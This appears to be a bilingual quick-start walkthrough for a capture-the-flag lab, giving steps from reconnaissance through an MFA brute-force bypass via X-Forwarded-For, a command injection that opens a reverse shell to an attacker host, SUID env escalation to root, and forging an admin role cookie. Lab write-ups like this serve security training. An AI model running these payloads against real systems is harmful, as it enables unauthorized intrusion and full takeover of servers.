# Trail Pack - Quick Start Guide

---

## Español

### Pasos Críticos para Resolver el Laboratorio

#### 1. Reconocimiento
```bash
nmap -p- -sV <target_ip>
gobuster dir -u http://<target_ip>:8000 -w /usr/share/wordlists/dirb/common.txt
```

#### 2. Crear Cuenta de Prueba
- Acceder a http://<target_ip>:8000/register
- Crear una nueva cuenta de usuario

#### 3. MFA Bypass (X-Forwarded-For)
- Intentar iniciar sesión y capturar la verificación de código MFA
- Usar Burpsuite para interceptar y modificar el header `X-Forwarded-For` en cada intento
- Script Python recomendado para automatizar el ataque de fuerza bruta al código

#### 4. Command Injection
- Una vez autenticado, acceder a la sección de "quejas"
- Inyectar comando: `&&/bin/bash -c "/bin/bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"`
- Establecer listener en máquina atacante: `nc -lvnp PORT`

#### 5. Escalada a Root
```bash
find / -perm -4000 -type f 2>/dev/null | grep env
/usr/bin/env /bin/bash
```

#### 6. Cookie Manipulation (Alternativa para Admin)
- Desencriptar cookie `user_info` desde base64
- Cambiar role de "user" a "admin"
- Reencriptar y usar en endpoint `/accounting`

#### 7. Flag
- Acceder al panel de administración
- La flag se encuentra oculta en el dashboard admin

**Tiempo Estimado:** 30-45 minutos

---

## English

### Critical Steps to Solve the Laboratory

#### 1. Reconnaissance
```bash
nmap -p- -sV <target_ip>
gobuster dir -u http://<target_ip>:8000 -w /usr/share/wordlists/dirb/common.txt
```

#### 2. Create Test Account
- Access http://<target_ip>:8000/register
- Create a new user account

#### 3. MFA Bypass (X-Forwarded-For)
- Attempt to log in and capture the MFA code verification
- Use Burpsuite to intercept and modify the `X-Forwarded-For` header on each attempt
- Python script recommended to automate brute force attack on the code

#### 4. Command Injection
- Once authenticated, access the "complaints" section
- Inject command: `&&/bin/bash -c "/bin/bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"`
- Set listener on attacker machine: `nc -lvnp PORT`

#### 5. Escalation to Root
```bash
find / -perm -4000 -type f 2>/dev/null | grep env
/usr/bin/env /bin/bash
```

#### 6. Cookie Manipulation (Alternative for Admin)
- Decrypt `user_info` cookie from base64
- Change role from "user" to "admin"
- Re-encrypt and use in `/accounting` endpoint

#### 7. Flag
- Access the administration panel
- The flag is hidden in the admin dashboard

**Estimated Time:** 30-45 minutes
